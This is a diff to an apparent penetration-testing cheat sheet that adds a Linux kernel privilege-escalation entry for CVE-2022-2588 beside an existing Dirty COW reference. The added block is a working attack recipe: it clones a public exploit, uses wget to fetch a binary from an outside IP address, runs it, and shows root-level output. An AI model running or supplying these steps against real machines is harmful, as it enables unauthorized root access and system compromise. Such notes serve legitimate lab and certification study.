@@ -857,6 +857,17 @@ gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
 ### Kernel Expoits
+#### CVE-2022-2588
+````
+git clone https://github.com/Markakd/CVE-2022-2588.git
+wget http://192.168.119.140/exp_file_credential
+chmod +x exp_file_credential
+./exp_file_credential
+su user
+Password: user
+id
+uid=0(user) gid=0(root) groups=0(root)
+````
 #### CVE-2016-5195
 ````
 https://github.com/firefart/dirtycow
